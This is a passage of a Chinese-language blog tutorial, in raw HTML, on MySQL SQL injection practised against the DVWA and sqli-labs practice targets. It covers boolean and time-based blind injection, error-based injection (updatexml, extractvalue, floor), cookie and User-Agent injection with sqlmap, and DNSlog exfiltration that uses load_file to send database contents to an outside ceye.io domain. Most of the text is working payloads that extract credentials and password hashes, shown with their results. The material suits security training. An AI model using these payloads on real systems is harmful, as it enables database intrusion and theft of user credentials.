class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;v&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(database(),3,1)=&#x27;</span>w<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(database(),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>#</span><br></pre></td></tr></table></figure><p>得到当前数据库库名为<code>dvwa</code></p><h3 id="暗月"><a href="#暗月" class="headerlink" title="暗月"></a>暗月</h3><h4 id="if-函数"><a href="#if-函数" class="headerlink" title="if()函数"></a>if()函数</h4><p><code>if(a,b,c)</code>，此if语句的含义是，如果a为真则返回值为b,否则返回值为c。</p><p>布尔型盲注入用到得 SQL 语句 select if(1&#x3D;1,1,0) if()函数在 mysql 是判断，第一 个参数表达式，如果条件成立，会显示 1，否则显示 0。1&#x3D;1 表达式可以换成构造的 SQL 攻击语句。</p><p>1’ and if(1&#x3D;1,1,0)–+ 页面返回正常，这个语句实际上是 1’and 1，真 and 真 结果 为真，1 是存在记录的。所以返回正确页面。</p><p><img src="/img/20220828094831.png"></p><h4 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h4><p>字符串截取，第一个参数是字符串，第二个参数是开始截取的位置，第三个是截取的长度。</p><p><img src="/img/20220828101940.png"></p><p>可以通过截取database()来猜解数据库名，第一个字符为d，猜解正确返回1，从而输出user_id&#x3D;1的正确结果，否则返回空。</p><p><img src="/img/20220828102344.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),1,1)=&#x27;d&#x27;,1,0)#</span><br><span class="line">1&#x27; and substring(database(),1,1)=&#x27;d&#x27;#</span><br></pre></td></tr></table></figure><p><img src="/img/20220828103043.png"></p><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><p>要查询当前库名，首先确定要查询数据库的长度，再通过截取字符进行对比。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())=4,1,0)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828104043.png"></p><h4 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h4><p>数据库常用的字符：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</span><br></pre></td></tr></table></figure><p>一个一个试太麻烦，可以用bp抓包爆破。</p><p>爆破模式选择 <a href="https://blog.csdn.net/weixin_44431280/article/details/123412272">Cluster bomb</a> ，长度和字符设为爆破点。</p><p><img src="/img/20220828112113.png"></p><p>第一个爆破点选择numbers数字，dvwa长度为4，随便添加一个数字区间，每次+1。</p><p><img src="/img/20220828114343.png"></p><p>第二个爆破点选择自己需要的字符。</p><p><img src="/img/20220828115135.png"></p><p>然后爆破，爆破完毕，选出200状态码的正确目标。</p><p><img src="/img/20220828121312.png"></p><p><img src="/img/20220828121343.png"></p><p>再以Payload1排序，成功爆破出数据库名dvwa。</p><p><img src="/img/20220828121500.png"></p><p>得到库名接着获取表名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0, 1),1,1)=&#x27;g&#x27;,1,0)--+</span><br></pre></td></tr></table></figure><p>步骤与获取库名大同小异，limit 0,1是第一个表，limit 1,1是第二个表。</p><p><img src="/img/20220828124820.png"></p><p>成功爆破出表名guestbook和users。</p><p><img src="/img/20220828125135.png"></p><p>得到表名之后 获取字段名，limit 0,1是第一个字段，limit 1,1是第二个字段，用 burpsuite 抓包修改变量。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and TABLE_SCHEMA=database() limit 0,1),1,1)=&#x27;i&#x27;,1,0)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828135444.png"></p><p>从结果看，字段有：user_id，first_name，last_name，user，password，avatar，last_login，failed_login。</p><p>最后获取账号和密码：</p><p>先获取账号+密码的总长度。</p><p><code>concat()</code> 起到拼接字符的作用，括号中写多少个字符都行，以逗号分隔。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and if((SELECT length(concat(user,0x3b,password)) from users limit 1)=40,1,0)--+</span><br></pre></td></tr></table></figure><p>得到长度为37，0x3b是分号，占了一位，所以显示38。</p><p><img src="/img/20220828133242.png"></p><p>爆破账号密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828141104.png"></p><p>整理得账号密码为admin；5f4dcc3b5aa765d61d8327deb882cf99。</p><h1 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3 报错注入"></a>3 报错注入</h1><p>程序开发期间需要告诉使用者某些报错信息 方便管理员进行调试，定位文件错 误。特别 php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。 在 php 中 使用 <a href="https://www.runoob.com/php/func-mysqli-error.html">mysql_error()</a> 函数。如果 SQL 注入存在时，会有报错信息返回， 可以采用报错注入。</p><p><strong>查看dvwa的SQL注入源代码</strong></p><p><img src="/img/20220828164724.png"></p><p>如果语法错误，msqli_error()、mysqli_connect_error()会将语法错误信息 显示到 页面上。</p><p><img src="/img/20220828165450.png"></p><p>输入 1’and info()–+ 显示当前库，其实是报错函数提示当前库（爆出库名dvwa）没有info()函数。</p><p><img src="/img/20220828165954.png"></p><p><img src="/img/20220828170015.png"></p><p>输入构造的攻击语句，页面返回数据库信息。</p><h2 id="XPath语法报错"><a href="#XPath语法报错" class="headerlink" title="XPath语法报错"></a>XPath语法报错</h2><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。 使用条件：<strong>mysql版本&gt;5.1.5</strong></p><h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正常语法：extractvalue(xml_document,Xpath_string);</span><br><span class="line">第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class="line">第二个参数：Xpath_string是xpath格式的字符串</span><br><span class="line">作用：从目标xml中返回包含所查询值的字符串</span><br></pre></td></tr></table></figure><p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p><p>常见用法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&quot; and(select extractvalue(&quot;anything&quot;,concat(&#x27;~&#x27;,(注入语句))))</span><br><span class="line">id=&quot; and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))</span><br><span class="line">id=&quot; and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class="line">注：</span><br><span class="line">0x7e  是~的asccii码</span><br><span class="line">concat(‘a’,‘b’)=“ab”</span><br><span class="line">version()=@@version</span><br><span class="line">‘~‘可以换成’#’、’$&#x27;等不满足xpath格式的字符</span><br><span class="line">extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</span><br></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>updatexml函数与extractvalue函数极为相似。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&#x27;and(select updatexml(&quot;anything&quot;,concat(&#x27;~&#x27;,(注入语句())),&quot;anything&quot;))</span><br></pre></td></tr></table></figure><p>当concat函数内拼接出的字符不符合xpath格式时，会报错，并将报错结果带回来。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select updatexml(1,concat(&#x27;~&#x27;,(select database())),1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot; and (select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">&#x27; and (select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">&quot; and (select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure><p>暗月</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and updatexml(1,concat(0x7e,version()),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828174111.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(xml_doument,XPath_string,new_value)</span><br><span class="line">第一个参数：XML的内容</span><br><span class="line">第二个参数：需要updata的位置XPath路径，XPath格式的字符串</span><br><span class="line">第三个参数：更新后的内容</span><br><span class="line">原理：</span><br><span class="line">第一、第三个参数随便写，主要是利用第二个参数，它会校验你输入的内容是否符合XPath格式，并且把校验失败的数据爆出来，其实是方便开发人员调试的。</span><br><span class="line">如何让全部的数据都校验失败呢？</span><br><span class="line">就是使用concat()在需要的数据前面加上一个XPath校验失败的东西就可以了。</span><br><span class="line">0x7e用来校验，version()是我们想要的数据，concat()用来连接它们两个。</span><br><span class="line">0x7e这个东西，它是 ~ 的16进制，不用被0x7e固定化了，只要能做到校验那填什么都可以，使用0x7e纯粹是显得比较专业。</span><br><span class="line">updatexml(1,concat(&#x27;#&#x27;,version()),1)这是#字符</span><br><span class="line">updatexml(1,concat(0x23,version()),1)这还是#字符</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,version()),1)这是~字符</span><br><span class="line">updatexml(1,concat(0x26,version()),1)这是&amp;字符</span><br><span class="line">特殊字符的16进制表：https://websitebuilders.com/tools/html-codes/ascii/</span><br></pre></td></tr></table></figure><p>查询数据库名和用户名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br><span class="line">1&#x27;and updatexml(1,concat(0x7e,user(),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828174605.png"></p><p><img src="/img/20220828174540.png"></p><p>但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法，每次获取 32 个字符串的长度。</p><p>除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure><p>获取账户密码（需要 root 用户才有足够大的权限）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select authentication_string from mysql.user limit 1;</span><br></pre></td></tr></table></figure><p><img src="/img/20220828175931.png"></p><p>只显示了0-32位。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828180448.png"></p><p>截取32-40位。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select updatexml(1,concat(0x7e,(select substring((select authentication_string from mysql.user limit 1),32,40)),0x7e),1))--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828184200.png"></p><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828190055.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828190302.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828192508.png"></p><h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><p>只获取了32位（算上 ~ 和逗号）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and table_schema=database())),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828191806.png"></p><p>接着获取后面的字段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and table_schema=database()),32,64)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828192328.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and table_schema=database()),64,96)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828192922.png"></p><h4 id="获取用户名密码"><a href="#获取用户名密码" class="headerlink" title="获取用户名密码"></a>获取用户名密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select user from users limit 0,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828194632.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828194901.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),32,64)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828194930.png"></p><p>整理得账号密码为 admin 和 5f4dcc3b5aa765d61d8327deb882cf99（md5解密为password）。</p><h2 id="利用主键重复报错进行注入"><a href="#利用主键重复报错进行注入" class="headerlink" title="利用主键重复报错进行注入"></a>利用主键重复报错进行注入</h2><p><strong>报错需要满足的条件</strong>：</p><ul><li>floor()报错注入在MySQL版本8.0 已失效，经过测试7.3.4nts也已失效(据说的 本人没有实践过)</li><li>注入语句中查询用到的表内数据必须&gt;&#x3D;3条</li><li>需要用到的count(*)、floor()或者ceil()、rand()、group by</li></ul><p><strong>floor报错原理详解</strong><br>常用floor报错语句：如union联合注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select count(*),concat_ws(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,version(),floor(rand(0)*2)) as xxx from information_schema.tables group by xxx -- qqq</span></span><br></pre></td></tr></table></figure><p>会出现如下的报错：ERROR 1062 (23000): Duplicate entry ‘5.5.53~1’ for key ‘group_key’。</p><p>其他查询将version()换成想要查询的语句即可。</p><p>涉及的函数<br>rand()函数：随机返回0~1之间的小数。<br>floor()函数：向下取整，比如1.314，floor(1.314)为1。<br>conact_ws()函数：将括号中的数据用第一个参数连接起来。<br>group by子句：分组语句，根据一个或多个列，对结果进行分组，常与聚合函数连用，用来统计。<br>as：别名，一般会将一段长的语句进行缩短。<br>count()函数：汇总统计数量。</p><h3 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h3><p>采用 floor 报错并不会存在长度问题，查询第一个表名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220828200129.png"></p><h3 id="获取字段-1"><a href="#获取字段-1" class="headerlink" title="获取字段"></a>获取字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;users&#x27; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure><p>使用burpsuite配合获取字段。</p><p><img src="/img/20220828200609.png"></p><p><img src="/img/20220828201137.png"></p><p>虽然爆破出来了，但是看着不直观，影响效率，可以过滤一下，设置网页固定内容获取。</p><p><img src="/img/20220828201418.png"></p><p><img src="/img/20220828201626.png"></p><p>再次攻击就会有个显示字段的列了。</p><p><img src="/img/20220828201757.png"></p><h3 id="获取账号密码"><a href="#获取账号密码" class="headerlink" title="获取账号密码"></a>获取账号密码</h3><p>现在已经获取 users 表的名字和它的字段名，接下来可以对内容进行查询。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220829165024.png"></p><p>如果存在多个用户，也可以配合burpsuite进行爆破。</p><p><img src="/img/20220829165258.png"></p><h1 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4 时间盲注"></a>4 时间盲注</h1><p>延时注入适用于显注和盲注，只要有延时，就能证明有注入漏洞，不用再sqlmap跑了，比较高效率。</p><p>时间盲注与布尔型注入的区别在于，时间注入是利用sleep()或benchmark()等函数让数据库执行的时间变长。</p><p>时间盲注多与if函数结合使用。如：<code>if(a,b,c)</code>，此if语句的含义是，如果a为真则返回值为b,否则返回值为c。</p><p>如：<code>if(length(database())&gt;1,sleep(5),1)</code>它的含义为，如果当前数据库名字符长度大于1，则执行sleep函数使数据库执行延迟，否则则返回1。</p><p>所以时间注入的本质也是布尔注入，只不过是用数据库是否延迟执行的方式来表达是与否的逻辑。</p><p>例子出自sqli-labs靶场的第九关。</p><p>正常的网页响应速度，10毫微秒。</p><p><img src="/img/20230606111327.png"></p><p>?id&#x3D;1’ and if(length(database())&gt;1,sleep(5),1)–+</p><p>执行sleep()函数后的响应时间，5秒。</p><p><img src="/img/20230606112058.png"></p><p>把&gt;1改为&gt;20，逻辑为否，没有延迟5秒。</p><p><img src="/img/20230606112430.png"></p><p>可以看到，一旦我们构造出结果为真的条件，网页（后端数据库）响应就会延迟。</p><p>我们把前文学到的盲注语句嵌入到刚刚的if、sleep组成的句子中，就可以完成接下来的注入了。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>if($盲注语句，sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>用sqlmap。</p><p><img src="/img/20230606114138.png"></p><p><img src="/img/20230606114158.png"></p><p>爆破库名。</p><p><img src="/img/20230606114335.png"></p><p><img src="/img/20230606114349.png"></p><h1 id="5-cookie注入"><a href="#5-cookie注入" class="headerlink" title="5 cookie注入"></a>5 cookie注入</h1><p>当参数在cookie中，这时可以试试cookie注入。</p><p>以sqlib第20关为例，第一个数据包Forward之后得到的第二个数据包，可以看到参数在cookie中。</p><p><img src="/img/20220924231549.png"></p><p>把请求包保存为less20.txt，修改文件，在参数后面加个 <code>*</code>  表示让sqlmap关注这个地方。</p><p><img src="/img/20220924232448.png"></p><p>然后用sqlmap一把梭。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">slqmap.py -r less20.txt --dbms=<span class="string">&quot;mysql&quot;</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/img/20220924232821.png"></p><h1 id="6-User-Agent注入"><a href="#6-User-Agent注入" class="headerlink" title="6 User-Agent注入"></a>6 User-Agent注入</h1><p>以sqlib第18关为例。</p><p><img src="/img/20220925102708.png"></p><p>请求正文中的uname和passwd的值一定要是数据库中存在的用户名和对应的密码，因为这关代码会先判断数据库中是否有该用户名和密码的用户，如果有才会将User-Agent和客户端ip信息写入数据库。</p><p>burp抓包在User-Agent中加入引号进行测试。</p><p>发现浏览器存在报错，存在注入点。</p><p><img src="/img/20220925102743.png"></p><p>跟上面cookie注入大同小异，UA加*字符。sqlmap一把梭。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r less18.txt --dbms=<span class="string">&quot;mysql&quot;</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/img/20220925110852.png"></p><h1 id="7-dnslog-把盲注变显注"><a href="#7-dnslog-把盲注变显注" class="headerlink" title="7 dnslog:把盲注变显注"></a>7 dnslog:把盲注变显注</h1><p>dnslog可以避免一个个去猜解，能直接显示出来想要的信息。</p><p><strong>前提条件：</strong></p><ul><li><p>目标主机必须是Windows。dnslog注入只能用于windows平台，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个<code>\\</code>，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有<strong>unc</strong>路径，也就无法使用dnslog注入。</p></li><li><p>在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以下内容摘自百度：</span><br><span class="line">什么是UNC路径？</span><br><span class="line">UNC(Universal Naming Convention),通用命名规则</span><br><span class="line">什么是UNC路径？UNC路径就是类似\\softer这样的形式的网络路径。</span><br><span class="line">UNC为网络（主要指局域网）上资源的完整Windows 2000名称。</span><br><span class="line">格式：\\servername\sharename，其中servername是服务器名。sharename是共享资源的名称。</span><br><span class="line">目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。</span><br></pre></td></tr></table></figure><p>unc路径是url所以只支持数字字母下划线，如果查询到的信息带特殊字符如 <code>@</code></p><p>可以将查询语句后的结果进行转码，即(select database())——–&gt;hex(select database())等形式</p><p>盲注的时候，一个一个字符的去猜解盲注数据，线程太大容易被waf拦截，dnslog能让我们直接看到想要的信息。</p><p>下面这是一个域名被解析的流程，其中，红色部分是可控的。我们只需要一个红色部分的DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级甚至三级域名上去请求，就可以通过DNS解析日志来获取到它们。</p><p><img src="/img/20220925230218.png"></p><p>首先，注册一个ceye.io的账号，然后看一下自己的ceye域名，比如yeuude.ceye.io，之后在此域名前随便加一个子域名，比如abcd.yeuude.ceye.io，然后ping它。</p><p>dnslog.cn同理。</p><p><img src="/img/20220925114711.png"></p><p>我们可以在后台看到Name一栏有我们ping的记录。dnslog就是域名的解析日志，我们域名的解析日志可以在后台看到。</p><p>那么我们可以构造SQL语句使得数据库发一个ping包，ping我们这个域名，比如user().yeuude.ceye.io，这样我们就可以在后台看到数据库当前用户的用户名了。</p><p>使用dnslog注入时，注意靶机的mysql数据库中 <code>secure_file_priv</code>，MySQL新特性secure_file_priv影响读写文件。</p><p>查看官方文档，secure file_priv参数用于限制LOAD DATA，SELECT…OUTFILE，LOAD FILE()传到哪个指定目录。</p><p>DNSLOG需要用到的load_file()函数，load_file()不仅能够加载本地文件，同时也能对诸如 <code>\\www.test.com</code> 这样的URL发起请求。</p><p>1、当second_file_priv没有值时，表示可以读取任意目录，不限制mysqld在任意目录的导入导出。</p><p>2、当secure_file_priv为<code>g:\</code>时，只能导入导出G盘的文件。</p><p>3、当secure_file_priv为<code>/tmp</code>时，表示限制mysqld只能在&#x2F;tmp目录中执行导入导出。</p><p>3、当secure_file_priv为<code>NULL</code>时，表示限制mysqld不允许导入导出，任何目录都不能被读取，load_file 不加载文件。</p><p>如果 null 解决如下：</p><p>修改 My.ini ，在 [mysqld] 下添加 secure_file_priv&#x3D;””</p><p><img src="/img/20220926175419.png"></p><p>然后重启mysql，然后查询Secure_File_Priv。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/20220926175443.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select concat(database(),&#x27;.yeuude.ceye.io&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/img/20220925224046.png"></p><p>使用load_file()函数发起请求。意思就是访问url <code>\\xxx.yeuude.ceye.io</code> 下的\AB，\AB是随便打的一个路径，访问不到这个东西的，但是ceye后台能显示dnslog日志。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,database(),<span class="string">&#x27;.yeuude.ceye.io\\AB&#x27;</span>));</span><br><span class="line">#\\\\  有两个\用于转义，转义后代表\\</span><br><span class="line">#\\AB  有一个\用于转义，转义后代表\AB</span><br></pre></td></tr></table></figure><p><img src="/img/20220925225754.png"></p><p>DVWA盲注。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 2,load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,database(),&#x27;</span>.yeuude.ceye.io\\AB<span class="string">&#x27;))#</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220926093440.png"></p><p>成功得到想要的信息。</p><p><img src="/img/20220926093915.png"></p><p>还有一个问题就是，再次使用同样的payload会触发缓存，后台没有dnslog日志，只需要换一个id参数就行了。</p><p>开始查询：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询表名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 2,load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;</span>.yeuude.ceye.io\\AB<span class="string">&#x27;))#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;.yeuude.ceye.io\\AB&#x27;</span>))#</span><br><span class="line">查询字段名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 2,load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select column_name from information_schema.columns where table_schema= &#x27;</span>dvwa<span class="string">&#x27; and table_name= &#x27;</span>users<span class="string">&#x27; limit 0,1),&#x27;</span>.yeuude.ceye.io\\AB<span class="string">&#x27;))#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span> <span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;.yeuude.ceye.io\\AB&#x27;</span>))#</span><br><span class="line">查询字段的值</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 2,load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select user from dvwa.users limit 0,1),&#x27;</span>.yeuude.ceye.io\\AB<span class="string">&#x27;))#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> dvwa.users limit <span class="number">0</span>,<span class="number">1</span>),<span 